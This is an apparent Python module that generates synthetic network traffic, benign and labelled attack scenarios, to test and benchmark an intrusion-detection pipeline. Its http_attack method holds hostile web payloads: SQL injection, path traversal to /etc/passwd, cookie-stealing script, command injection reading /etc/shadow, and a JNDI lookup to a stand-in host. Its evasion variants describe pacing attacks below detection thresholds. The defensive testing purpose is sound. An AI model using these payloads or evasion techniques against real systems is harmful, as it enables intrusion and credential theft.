"""
PacketSimulator — synthetic traffic source and the engine loop that drives it.

Two responsibilities, deliberately separated:

  TrafficGenerator  builds real Ethernet frames: a benign background mix plus
                    named attack scenarios with known ground truth. Seeded, so
                    a given seed always produces byte-identical output — which
                    is what makes the tests and the benchmark reproducible.

  PacketSimulator   the pipeline: frames -> ProtocolAnalyzer -> ThreatDetector
                    -> batched persistence, with measured (not invented)
                    throughput and latency written to performance_metrics.

Nothing downstream knows the frames are synthetic. Replacing TrafficGenerator
with a scapy AsyncSniffer or a pcap reader requires no other change:

    sniffer = AsyncSniffer(prn=lambda p: sim.process(bytes(p), time.time()))
"""

import random
import threading
import time

import frames as F
from ProtocolAnalyzer import ProtocolAnalyzer

# Background traffic mix. Weights approximate an enterprise egress profile.
BACKGROUND_MIX = [
    ('HTTPS', 30), ('HTTP', 16), ('DNS', 14), ('TLS_APP', 10), ('QUIC', 6),
    ('SSH', 4), ('SMTP', 4), ('IMAP', 3), ('POP3', 2), ('SMB', 4),
    ('ICMP', 3), ('NTP', 2), ('SNMP', 1), ('ARP', 2), ('DHCP', 1),
    ('RDP', 1), ('FTP', 1), ('TELNET', 1),
]

INTERNAL_HOSTS = ['10.0.1.%d' % i for i in range(10, 40)]
INTERNAL_SERVERS = ['10.0.2.10', '10.0.2.11', '10.0.2.12']
RESOLVERS = ['8.8.8.8', '1.1.1.1', '10.0.2.53']
# Deliberately spread across many /24s so ordinary browsing never resembles a
# contiguous host sweep.
EXTERNAL_HOSTS = [
    '104.16.%d.%d' % (n, m) for n in (12, 44, 91) for m in (5, 77, 200)
] + [
    '13.112.%d.%d' % (n, m) for n in (7, 60) for m in (11, 190)
] + [
    '142.250.%d.%d' % (n, m) for n in (4, 72) for m in (14, 238)
] + ['51.15.33.9', '77.88.55.60', '203.0.113.45', '198.51.100.22']

BENIGN_DOMAINS = [
    'www.example.com', 'cdn.example.net', 'api.service.io', 'mail.corp.local',
    'updates.vendor.com', 'telemetry.saas.co', 'login.provider.org',
]
BENIGN_UA = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
    'curl/8.4.0',
]
MACS = ['02:00:00:00:%02x:%02x' % (i // 256, i % 256) for i in range(1, 60)]


class TrafficGenerator:
    """Deterministic synthetic traffic. Same seed -> same bytes."""

    def __init__(self, seed=None):
        self.rng = random.Random(seed)
        self._ident = 0
        self._session_ports = {}

    def _next_ident(self):
        self._ident = (self._ident + 1) & 0xFFFF
        return self._ident

    def _ephemeral(self):
        return self.rng.randint(32768, 60999)

    def _session_port(self, key):
        """A source port that persists for the life of a conversation.

        Real hosts hold one ephemeral port open for a connection rather than
        picking a new one per packet. Modelling that is what lets the flow
        table actually aggregate — with a fresh port each packet, every packet
        becomes its own 'flow' and `connections` degenerates into a second
        copy of `packets`.
        """
        port = self._session_ports.get(key)
        if port is None or self.rng.random() < 0.02:   # occasional reconnect
            port = self.rng.randint(32768, 60999)
            self._session_ports[key] = port
        return port

    # ── benign background ────────────────────────────────────────────────────

    def background_frame(self, ts):
        """One benign frame. Chosen so it never trips a detector threshold."""
        kind = self.rng.choices([k for k, _ in BACKGROUND_MIX],
                                weights=[w for _, w in BACKGROUND_MIX])[0]
        src = self.rng.choice(INTERNAL_HOSTS)
        ext = self.rng.choice(EXTERNAL_HOSTS)
        sport = self._session_port((src, ext, kind))
        ident = self._next_ident()

        if kind == 'HTTPS':
            if self.rng.random() < 0.3:
                payload = F.tls_client_hello(
                    self.rng.choice(BENIGN_DOMAINS), version=0x0303,
                    cipher_count=self.rng.randint(12, 24))
            else:
                payload = F.tls_application_data(self.rng.randint(200, 1300))
            return F.tcp_frame(payload, src, ext, sport, 443, 'PSH|ACK',
                               ident=ident)
        if kind == 'TLS_APP':
            return F.tcp_frame(F.tls_application_data(
                self.rng.randint(400, 1400)), src, ext, sport, 443,
                'PSH|ACK', ident=ident)
        if kind == 'HTTP':
            return F.tcp_frame(F.http_request(
                self.rng.choice(['GET', 'GET', 'POST']),
                self.rng.choice(['/', '/index.html', '/api/v1/status',
                                 '/assets/app.js', '/health']),
                self.rng.choice(BENIGN_DOMAINS),
                self.rng.choice(BENIGN_UA)), src, ext, sport, 80,
                'PSH|ACK', ident=ident)
        if kind == 'DNS':
            resolver = self.rng.choice(RESOLVERS)
            name = self.rng.choice(BENIGN_DOMAINS)
            if self.rng.random() < 0.45:
                return F.udp_frame(F.dns_response(name, 'A', answers=1),
                                   resolver, src, 53, sport, ident=ident)
            return F.udp_frame(F.dns_query(name, 'A'), src, resolver,
                               sport, 53, ident=ident)
        if kind == 'QUIC':
            return F.udp_frame(F.quic_initial(), src, ext, sport, 443,
                               ident=ident)
        if kind == 'SSH':
            server = self.rng.choice(INTERNAL_SERVERS)
            return F.tcp_frame(F.ssh_binary(size=self.rng.randint(64, 600)),
                               src, server, sport, 22, 'PSH|ACK', ident=ident)
        if kind == 'SMTP':
            server = INTERNAL_SERVERS[0]
            if self.rng.random() < 0.5:
                return F.tcp_frame(F.line_protocol('250 OK'), server, src,
                                   25, sport, 'PSH|ACK', ident=ident)
            return F.tcp_frame(F.line_protocol('MAIL FROM:<user@corp.local>'),
                               src, server, sport, 25, 'PSH|ACK', ident=ident)
        if kind == 'IMAP':
            server = INTERNAL_SERVERS[1]
            return F.tcp_frame(F.line_protocol('a00%d OK FETCH completed'
                                               % self.rng.randint(1, 9)),
                               server, src, 143, sport, 'PSH|ACK', ident=ident)
        if kind == 'POP3':
            server = INTERNAL_SERVERS[1]
            return F.tcp_frame(F.line_protocol('+OK message follows'), server,
                               src, 110, sport, 'PSH|ACK', ident=ident)
        if kind == 'SMB':
            # One file server only: never enough fan-out for lateral movement.
            return F.tcp_frame(F.smb2_header(self.rng.randint(0, 16)), src,
                               INTERNAL_SERVERS[2], sport, 445, 'PSH|ACK',
                               ident=ident)
        if kind == 'ICMP':
            return F.icmp_frame(bytes(range(32)), src,
                                self.rng.choice(INTERNAL_SERVERS),
                                ident=self.rng.randint(1, 4000))
        if kind == 'NTP':
            return F.udp_frame(F.ntp_client(), src, '10.0.2.123', sport, 123,
                               ident=ident)
        if kind == 'SNMP':
            return F.udp_frame(F.snmp_message('public', 1, 'get-request'),
                               '10.0.2.20', self.rng.choice(INTERNAL_SERVERS),
                               sport, 161, ident=ident)
        if kind == 'ARP':
            idx = self.rng.randrange(len(INTERNAL_HOSTS))
            host = INTERNAL_HOSTS[idx]
            # Stable IP<->MAC binding, so no conflict is ever produced.
            return F.arp_frame(1, MACS[idx % len(MACS)], host,
                               '00:00:00:00:00:00', '10.0.1.1')
        if kind == 'DHCP':
            idx = self.rng.randrange(len(INTERNAL_HOSTS))
            return F.udp_frame(F.dhcp_message(
                self.rng.choice([1, 3]), MACS[idx % len(MACS)]),
                '0.0.0.0', '255.255.255.255', 68, 67, ident=ident)
        if kind == 'RDP':
            return F.tcp_frame(F.rdp_connection_request('svc_helpdesk'), src,
                               INTERNAL_SERVERS[0], sport, 3389, 'PSH|ACK',
                               ident=ident)
        if kind == 'FTP':
            return F.tcp_frame(F.line_protocol('226 Transfer complete'),
                               INTERNAL_SERVERS[2], src, 21, sport,
                               'PSH|ACK', ident=ident)
        return F.tcp_frame(F.telnet_negotiation(), src, INTERNAL_SERVERS[0],
                           sport, 23, 'PSH|ACK', ident=ident)

    def background(self, count, start_ts=0.0, rate_pps=90.0):
        """`count` benign frames with timestamps spaced at ~rate_pps."""
        out, ts = [], start_ts
        for _ in range(count):
            out.append((ts, self.background_frame(ts)))
            ts += self.rng.uniform(0.5, 1.5) / rate_pps
        return out

    # ── attack scenarios (ground truth for tests) ────────────────────────────

    def port_scan(self, start_ts=0.0, attacker='185.220.101.44',
                  target='10.0.2.10', ports=40):
        out, ts = [], start_ts
        for i in range(ports):
            out.append((ts, F.tcp_frame(b'', attacker, target,
                                        self._ephemeral(), 1 + i * 3, 'SYN',
                                        ident=self._next_ident())))
            ts += 0.05
        return out

    def network_recon(self, start_ts=0.0, attacker='185.220.101.44',
                      subnet='10.0.9', hosts=35):
        out, ts = [], start_ts
        for i in range(hosts):
            out.append((ts, F.tcp_frame(b'', attacker,
                                        '%s.%d' % (subnet, i + 1),
                                        self._ephemeral(), 445, 'SYN',
                                        ident=self._next_ident())))
            ts += 0.08
        return out

    def icmp_sweep(self, start_ts=0.0, attacker='185.220.101.44',
                   subnet='10.0.9', hosts=25):
        out, ts = [], start_ts
        for i in range(hosts):
            out.append((ts, F.icmp_frame(bytes(range(32)), attacker,
                                         '%s.%d' % (subnet, i + 1),
                                         ident=i, seq=i)))
            ts += 0.1
        return out

    def brute_force(self, start_ts=0.0, attacker='45.33.32.156',
                    target='10.0.2.12', attempts=12, succeed=False):
        """FTP password guessing: client PASS, server 530, repeat."""
        out, ts = [], start_ts
        sport = self._ephemeral()
        for i in range(attempts):
            out.append((ts, F.tcp_frame(
                F.line_protocol('USER admin'), attacker, target, sport, 21,
                'PSH|ACK', ident=self._next_ident())))
            ts += 0.2
            out.append((ts, F.tcp_frame(
                F.line_protocol('PASS guess%d' % i), attacker, target, sport,
                21, 'PSH|ACK', ident=self._next_ident())))
            ts += 0.3
            out.append((ts, F.tcp_frame(
                F.line_protocol('530 Login incorrect'), target, attacker, 21,
                sport, 'PSH|ACK', ident=self._next_ident())))
            ts += 0.5
        if succeed:
            out.append((ts, F.tcp_frame(
                F.line_protocol('230 User logged in'), target, attacker, 21,
                sport, 'PSH|ACK', ident=self._next_ident())))
        return out

    def credential_stuffing(self, start_ts=0.0, attacker='45.33.32.156',
                            target='10.0.2.12', users=14):
        out, ts = [], start_ts
        for i in range(users):
            out.append((ts, F.tcp_frame(
                F.line_protocol('USER user%03d' % i), attacker, target,
                self._ephemeral(), 21, 'PSH|ACK', ident=self._next_ident())))
            ts += 0.4
        return out

    def c2_beacon(self, start_ts=0.0, implant='10.0.1.23',
                  c2='91.108.4.77', callbacks=12, interval=60.0, jitter=0.02):
        """Metronomic HTTP check-ins — the low-jitter signature."""
        out, ts = [], start_ts
        for i in range(callbacks):
            out.append((ts, F.tcp_frame(
                F.http_request('POST', '/api/v1/beacon', 'cdn.updates.top',
                               'Mozilla/5.0', body=b'\x00' * 48),
                implant, c2, 44300, 80, 'PSH|ACK',
                ident=self._next_ident())))
            ts += interval * (1 + self.rng.uniform(-jitter, jitter))
        return out

    def dns_tunnel(self, start_ts=0.0, victim='10.0.1.31',
                   resolver='8.8.8.8', zone='tunnel-c2.net', queries=50):
        """Base32-style encoded payload in oversized labels over TXT."""
        alphabet = 'abcdefghijklmnopqrstuvwxyz234567'
        out, ts = [], start_ts
        for _ in range(queries):
            label = ''.join(self.rng.choice(alphabet) for _ in range(58))
            out.append((ts, F.udp_frame(
                F.dns_query('%s.%s' % (label, zone), 'TXT'), victim, resolver,
                self._ephemeral(), 53, ident=self._next_ident())))
            ts += 0.4
        return out

    def dga_lookups(self, start_ts=0.0, victim='10.0.1.33',
                    resolver='8.8.8.8', count=25):
        """High-entropy domains that all come back NXDOMAIN."""
        out, ts = [], start_ts
        for _ in range(count):
            name = ''.join(self.rng.choice('abcdefghijklmnopqrstuvwxyz0123456789')
                           for _ in range(self.rng.randint(14, 22))) + '.biz'
            sport = self._ephemeral()
            out.append((ts, F.udp_frame(F.dns_query(name, 'A'), victim,
                                        resolver, sport, 53,
                                        ident=self._next_ident())))
            ts += 0.15
            out.append((ts, F.udp_frame(
                F.dns_response(name, 'A', rcode=3, answers=0), resolver,
                victim, 53, sport, ident=self._next_ident())))
            ts += 0.25
        return out

    def icmp_tunnel(self, start_ts=0.0, victim='10.0.1.27',
                    c2='203.0.113.45', packets=20, payload_len=512):
        out, ts = [], start_ts
        for i in range(packets):
            blob = bytes(self.rng.randrange(256) for _ in range(payload_len))
            out.append((ts, F.icmp_frame(blob, victim, c2, ident=0x1337,
                                         seq=i)))
            ts += 0.7
        return out

    def protocol_tunnel(self, start_ts=0.0, host='10.0.1.29',
                        remote='198.51.100.22', packets=8):
        """SSH spoken on 443 to slip past an egress filter."""
        out, ts = [], start_ts
        for _ in range(packets):
            out.append((ts, F.tcp_frame(F.ssh_banner(), host, remote,
                                        self._ephemeral(), 443, 'PSH|ACK',
                                        ident=self._next_ident())))
            ts += 1.5
        return out

    def data_exfil(self, start_ts=0.0, victim='10.0.1.25',
                   remote='95.163.1.20', total_bytes=6_000_000,
                   chunk=1400):
        out, ts = [], start_ts
        sent = 0
        sport = self._ephemeral()
        while sent < total_bytes:
            body = bytes(self.rng.randrange(256) for _ in range(chunk))
            out.append((ts, F.tcp_frame(
                F.tls_application_data(len(body)), victim, remote, sport, 443,
                'PSH|ACK', ident=self._next_ident())))
            sent += chunk
            ts += 0.02
        return out

    def lateral_movement(self, start_ts=0.0, pivot='10.0.1.15', targets=8):
        out, ts = [], start_ts
        for i in range(targets):
            target = '10.0.2.%d' % (100 + i)
            for port in (445, 3389):
                out.append((ts, F.tcp_frame(b'', pivot, target,
                                            self._ephemeral(), port, 'SYN',
                                            ident=self._next_ident())))
                ts += 0.3
        return out

    def syn_flood(self, start_ts=0.0, target='10.0.2.10', port=80,
                  packets=400, sources=200):
        out, ts = [], start_ts
        for i in range(packets):
            spoofed = '198.18.%d.%d' % (i % sources // 254, i % 254 + 1)
            out.append((ts, F.tcp_frame(b'', spoofed, target,
                                        self._ephemeral(), port, 'SYN',
                                        ident=self._next_ident())))
            ts += 0.012
        return out

    def udp_flood(self, start_ts=0.0, target='10.0.2.11', port=19,
                  packets=600):
        out, ts = [], start_ts
        for i in range(packets):
            out.append((ts, F.udp_frame(
                b'\x00' * 512, '198.18.%d.%d' % (i // 254 % 255, i % 254 + 1),
                target, self._ephemeral(), port, ident=self._next_ident())))
            ts += 0.01
        return out

    def ntp_amplification(self, start_ts=0.0, victim='10.0.2.30',
                          reflector='91.108.4.90', rounds=6):
        out, ts = [], start_ts
        for _ in range(rounds):
            out.append((ts, F.udp_frame(F.ntp_monlist_request(), victim,
                                        reflector, 41234, 123,
                                        ident=self._next_ident())))
            ts += 0.05
            out.append((ts, F.udp_frame(F.ntp_monlist_response(entries=8),
                                        reflector, victim, 123, 41234,
                                        ident=self._next_ident())))
            ts += 0.4
        return out

    def http_attack(self, start_ts=0.0, attacker='45.33.32.156',
                    target='10.0.2.10'):
        # URL-encoded the way a real scanner sends them.
        payloads = [
            "/products?id=1'%20UNION%20ALL%20SELECT%20username,password"
            '%20FROM%20users--',
            '/download?file=../../../../etc/passwd',
            '/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E',
            '/api?cmd=;cat%20/etc/shadow',
            '/${jndi:ldap://evil.example/a}',
        ]
        out, ts = [], start_ts
        for uri in payloads:
            out.append((ts, F.tcp_frame(
                F.http_request('GET', uri, 'shop.corp.local', 'sqlmap/1.7'),
                attacker, target, self._ephemeral(), 80, 'PSH|ACK',
                ident=self._next_ident())))
            ts += 1.0
        return out

    def arp_spoof(self, start_ts=0.0, attacker_mac='de:ad:be:ef:00:01',
                  gateway='10.0.1.1', victim_mac='02:00:00:00:00:07'):
        out, ts = [], start_ts
        # Legitimate gateway announces itself first, establishing the binding.
        out.append((ts, F.arp_frame(2, victim_mac, gateway, victim_mac,
                                    gateway)))
        ts += 1.0
        # Attacker then claims the same IP and keeps re-announcing it.
        for _ in range(10):
            out.append((ts, F.arp_frame(2, attacker_mac, gateway,
                                        attacker_mac, gateway)))
            ts += 1.5
        return out

    def tls_anomaly(self, start_ts=0.0, host='10.0.1.35',
                    remote='95.163.1.30', count=4):
        out, ts = [], start_ts
        for _ in range(count):
            out.append((ts, F.tcp_frame(
                F.tls_client_hello(None, version=0x0301, cipher_count=2,
                                   record_version=0x0301),
                host, remote, self._ephemeral(), 443, 'PSH|ACK',
                ident=self._next_ident())))
            ts += 5.0
        return out

    # ── evasion variants ─────────────────────────────────────────────────────
    #
    # Same attacks, shaped to sit near or under a tuned threshold. These exist
    # to measure where detection actually stops rather than to flatter it: a
    # threshold that suppresses benign noise necessarily creates a band an
    # attacker can hide in, and the replay report quantifies that band instead
    # of leaving it unstated.

    def slow_port_scan(self, start_ts=0.0, attacker='185.220.101.44',
                       target='10.0.2.10', ports=30, spacing=12.0):
        """A scan paced so few ports land inside any one detection window."""
        out, ts = [], start_ts
        for i in range(ports):
            out.append((ts, F.tcp_frame(b'', attacker, target,
                                        self._ephemeral(), 1 + i * 7, 'SYN',
                                        ident=self._next_ident())))
            ts += spacing
        return out

    def jittered_beacon(self, start_ts=0.0, implant='10.0.1.24',
                        c2='91.108.4.78', callbacks=14, interval=45.0,
                        jitter=0.45):
        """C2 check-ins with human-scale jitter added to defeat CV scoring."""
        return self.c2_beacon(start_ts=start_ts, implant=implant, c2=c2,
                              callbacks=callbacks, interval=interval,
                              jitter=jitter)

    def fragmented_dns_tunnel(self, start_ts=0.0, victim='10.0.1.32',
                              resolver='8.8.8.8', zone='split-c2.net',
                              queries=60):
        """Payload split across several short labels instead of one long one."""
        alphabet = 'abcdefghijklmnopqrstuvwxyz234567'
        out, ts = [], start_ts
        for _ in range(queries):
            labels = ['.'.join(
                ''.join(self.rng.choice(alphabet) for _ in range(14))
                for _ in range(4))]
            out.append((ts, F.udp_frame(
                F.dns_query('%s.%s' % (labels[0], zone), 'A'), victim,
                resolver, self._ephemeral(), 53, ident=self._next_ident())))
            ts += 0.5
        return out

    def distributed_exfil(self, start_ts=0.0, victim='10.0.1.26',
                          remotes=('95.163.1.21', '95.163.2.22',
                                   '95.163.3.23', '95.163.4.24',
                                   '95.163.5.25'),
                          total_bytes=6_000_000, chunk=1400):
        """The same volume, spread across peers so no single flow stands out."""
        out, ts = [], start_ts
        sent = 0
        ports = {r: self._ephemeral() for r in remotes}
        index = 0
        while sent < total_bytes:
            remote = remotes[index % len(remotes)]
            out.append((ts, F.tcp_frame(
                F.tls_application_data(chunk), victim, remote, ports[remote],
                443, 'PSH|ACK', ident=self._next_ident())))
            sent += chunk
            index += 1
            ts += 0.02
        return out

    def throttled_syn_flood(self, start_ts=0.0, target='10.0.2.10', port=80,
                            packets=1200, sources=200, spacing=0.09):
        """SYN volume held just under the per-window rate threshold."""
        out, ts = [], start_ts
        for i in range(packets):
            spoofed = '198.19.%d.%d' % (i % sources // 254, i % 254 + 1)
            out.append((ts, F.tcp_frame(b'', spoofed, target,
                                        self._ephemeral(), port, 'SYN',
                                        ident=self._next_ident())))
            ts += spacing
        return out

    def slow_brute_force(self, start_ts=0.0, attacker='45.33.32.157',
                         target='10.0.2.12', attempts=15, spacing=70.0):
        """Password guessing paced below the failures-per-window threshold."""
        out, ts = [], start_ts
        sport = self._ephemeral()
        for i in range(attempts):
            out.append((ts, F.tcp_frame(
                F.line_protocol('USER admin'), attacker, target, sport, 21,
                'PSH|ACK', ident=self._next_ident())))
            ts += 1.0
            out.append((ts, F.tcp_frame(
                F.line_protocol('PASS guess%d' % i), attacker, target, sport,
                21, 'PSH|ACK', ident=self._next_ident())))
            ts += 1.0
            out.append((ts, F.tcp_frame(
                F.line_protocol('530 Login incorrect'), target, attacker, 21,
                sport, 'PSH|ACK', ident=self._next_ident())))
            ts += spacing
        return out

    # Scenario name -> (method, threat types it is expected to raise)
    #
    # This is the ground truth the PCAP replay suite scores against, so a
    # scenario lists *every* threat its traffic genuinely exhibits, not just
    # the one it is named for. `brute_force` is the case that makes the point:
    # guessing an FTP password necessarily sends that password in cleartext,
    # so the traffic is both a brute-force attempt and a credential exposure,
    # and an analyst should see both alerts.
    SCENARIOS = {
        'port_scan': ('port_scan', ['port_scan']),
        'network_recon': ('network_recon', ['network_recon']),
        'icmp_sweep': ('icmp_sweep', ['network_recon']),
        'brute_force': ('brute_force', ['brute_force', 'credential_attack']),
        'credential_stuffing': ('credential_stuffing', ['credential_attack']),
        'c2_beacon': ('c2_beacon', ['c2_beacon']),
        'dns_tunnel': ('dns_tunnel', ['dns_tunnel']),
        'dga_lookups': ('dga_lookups', ['suspicious_dns']),
        'icmp_tunnel': ('icmp_tunnel', ['icmp_tunnel']),
        'protocol_tunnel': ('protocol_tunnel', ['protocol_tunnel']),
        'data_exfil': ('data_exfil', ['data_exfil']),
        'lateral_movement': ('lateral_movement', ['lateral_movement']),
        'syn_flood': ('syn_flood', ['syn_flood']),
        'udp_flood': ('udp_flood', ['udp_flood']),
        'ntp_amplification': ('ntp_amplification', ['amplification']),
        'http_attack': ('http_attack', ['http_anomaly']),
        'arp_spoof': ('arp_spoof', ['arp_spoof']),
        'tls_anomaly': ('tls_anomaly', ['tls_anomaly']),
    }

    # Evasion variants, kept separate from SCENARIOS so the canonical corpus
    # and the boundary corpus are scored — and reported — apart from each
    # other. Expected threats are what the traffic *is*, not what the current
    # thresholds happen to catch.
    EVASIONS = {
        'slow_port_scan': ('slow_port_scan', ['port_scan']),
        'jittered_beacon': ('jittered_beacon', ['c2_beacon']),
        'fragmented_dns_tunnel': ('fragmented_dns_tunnel', ['dns_tunnel']),
        'distributed_exfil': ('distributed_exfil', ['data_exfil']),
        'throttled_syn_flood': ('throttled_syn_flood', ['syn_flood']),
        'slow_brute_force': ('slow_brute_force',
                             ['brute_force', 'credential_attack']),
    }

    ALL_SCENARIOS = {}      # populated below; SCENARIOS + EVASIONS

    def scenario(self, name, start_ts=0.0, **kwargs):
        method, _expected = self.ALL_SCENARIOS[name]
        return getattr(self, method)(start_ts=start_ts, **kwargs)

    @classmethod
    def expected_threats(cls, name):
        return cls.ALL_SCENARIOS[name][1]

    @classmethod
    def scenario_class(cls, name):
        return 'attack' if name in cls.SCENARIOS else 'evasion'


TrafficGenerator.ALL_SCENARIOS = dict(TrafficGenerator.SCENARIOS,
                                      **TrafficGenerator.EVASIONS)


class PacketSimulator:
    """Runs frames through parse -> detect -> persist with real measurement."""

    def __init__(self, db, threat_detector, protocol_analyzer=None,
                 seed=None, cfg=None):
        self.db = db
        self.td = threat_detector
        self.pa = protocol_analyzer or ProtocolAnalyzer()
        self.gen = TrafficGenerator(seed)
        self.cfg = (cfg or threat_detector.cfg)['engine']
        self._running = False
        self._lock = threading.Lock()
        self._batch = []
        self._findings = []
        self._last_flush = time.time()
        self.packets_processed = 0
        self.alerts_generated = 0
        self.parse_ns = 0
        self.detect_ns = 0
        self.db_write_ms = 0.0

    # ── pipeline ─────────────────────────────────────────────────────────────

    def process(self, frame, ts):
        """Parse one frame, run detection, buffer for persistence.

        This is the seam a real capture backend plugs into.
        """
        t0 = time.perf_counter_ns()
        pkt = self.pa.safe_parse(frame, ts)
        t1 = time.perf_counter_ns()
        self.parse_ns += t1 - t0
        if pkt is None:
            return []
        findings = self.td.analyze(pkt)
        self.detect_ns += time.perf_counter_ns() - t1

        self.packets_processed += 1
        self.alerts_generated += len(findings)
        if self.cfg['store_packets']:
            self._batch.append(pkt)
        self._findings.extend(findings)
        return findings

    def flush(self):
        """Persist the buffered batch. Returns milliseconds spent writing.

        The buffer swap is under the lock because gunicorn calls this from a
        worker-exit hook while the engine thread is still appending: an
        unguarded read-then-clear can drop packets buffered between the two
        statements, or write them twice.
        """
        with self._lock:
            if not self._batch and not self._findings:
                return 0.0
            batch, findings = self._batch, self._findings
            self._batch, self._findings = [], []
        _p, _a, ms = self.db.persist_batch(batch, findings)
        self.db_write_ms += ms
        self._last_flush = time.time()
        return ms

    def maybe_flush(self):
        if (len(self._batch) >= self.cfg['packet_batch']
                or len(self._findings) >= 50
                or time.time() - self._last_flush >= self.cfg[
                    'flush_interval_s']):
            return self.flush()
        return 0.0

    def run_frames(self, frames, record_metrics=True):
        """Process an explicit list of (ts, frame) pairs.

        Used by tests and by any batch/pcap replay. Records the run's actual
        measured throughput, exactly as the live loop does — the wall time
        here is real work, not a simulated window.
        """
        found = []
        started = time.perf_counter()
        before_packets = self.packets_processed
        before_alerts = self.alerts_generated
        for ts, frame in frames:
            found.extend(self.process(frame, ts))
            self.maybe_flush()
        self.flush()
        elapsed = time.perf_counter() - started
        if record_metrics and elapsed > 0:
            self._record_window(elapsed,
                                self.packets_processed - before_packets,
                                self.alerts_generated - before_alerts)
        return found

    # ── live loop ────────────────────────────────────────────────────────────

    def run(self, rate_pps=95.0, duration_s=None, metrics_window_s=60.0,
            first_scenario_after_s=20.0, scenario_gap_s=(45.0, 120.0)):
        """Continuous simulation. Injects attack scenarios periodically.

        The three timing arguments are parameters rather than constants so the
        loop's own accounting can be exercised by a test: with the shipped
        defaults a test would have to run for a real minute before the first
        metrics row, and 20 seconds before the first alert.
        """
        self._running = True
        started = time.time()
        interval = 1.0 / rate_pps
        window_start = time.time()
        window_pkts = window_alerts = 0
        pending = []
        scenario_names = list(TrafficGenerator.SCENARIOS)
        next_scenario = time.time() + first_scenario_after_s

        while self._running:
            now = time.time()
            if duration_s and now - started >= duration_s:
                break
            try:
                if now >= next_scenario and not pending:
                    name = self.gen.rng.choice(scenario_names)
                    # Scenario frames carry their own relative timeline;
                    # re-base it onto the wall clock.
                    raw = self.gen.scenario(name, start_ts=0.0)
                    base = raw[0][0] if raw else 0.0
                    pending = [(now + (t - base), fr) for t, fr in raw]
                    next_scenario = now + self.gen.rng.uniform(*scenario_gap_s)

                if pending and pending[0][0] <= now:
                    ts, frame = pending.pop(0)
                    found = self.process(frame, now)
                else:
                    frame = self.gen.background_frame(now)
                    found = self.process(frame, now)
                window_pkts += 1
                # Without this the per-window metric row always reported zero
                # alerts, however many the window actually raised.
                window_alerts += len(found)

                self.maybe_flush()

                elapsed = now - window_start
                if elapsed >= metrics_window_s:
                    self._record_window(elapsed, window_pkts, window_alerts)
                    window_start, window_pkts, window_alerts = now, 0, 0

                time.sleep(interval)
            except Exception:
                # Never let one bad frame kill the loop, but do not hide the
                # failure either — parse_errors and detector_errors surface it.
                time.sleep(0.05)

        # Record the partial window the loop was in the middle of. Without
        # this, everything measured since the last window boundary is thrown
        # away on shutdown — up to a full window's packets and alerts on every
        # `docker stop`, and the metrics never account for them.
        final_elapsed = time.time() - window_start
        if window_pkts and final_elapsed > 0:
            self._record_window(final_elapsed, window_pkts, window_alerts)
        self.flush()

    def stop(self):
        self._running = False

    def _record_window(self, elapsed, packets, alerts):
        """Write measured throughput. Every value here is observed."""
        latencies = []
        for _ in range(5):
            t0 = time.perf_counter()
            self.db.get_overview()
            latencies.append((time.perf_counter() - t0) * 1000)
        latencies.sort()
        self.db.record_performance({
            'source': 'engine',
            'window_s': round(elapsed, 3),
            'packets_processed': packets,
            'packets_per_min': round(packets / elapsed * 60, 1),
            'alerts_generated': alerts,
            'parse_errors': self.pa.parse_errors,
            'parse_us_avg': round(
                self.parse_ns / max(self.packets_processed, 1) / 1000.0, 3),
            'detect_us_avg': round(
                self.detect_ns / max(self.packets_processed, 1) / 1000.0, 3),
            'db_write_ms': round(self.db_write_ms, 2),
            'query_p50_ms': round(latencies[len(latencies) // 2], 3),
            'query_p95_ms': round(latencies[-1], 3),
        })

    def stats(self):
        return {
            'packets_processed': self.packets_processed,
            'alerts_generated': self.alerts_generated,
            'parse_errors': self.pa.parse_errors,
            'parse_us_avg': round(
                self.parse_ns / max(self.packets_processed, 1) / 1000.0, 3),
            'detect_us_avg': round(
                self.detect_ns / max(self.packets_processed, 1) / 1000.0, 3),
            'protocols_seen': dict(self.pa.stats),
        }
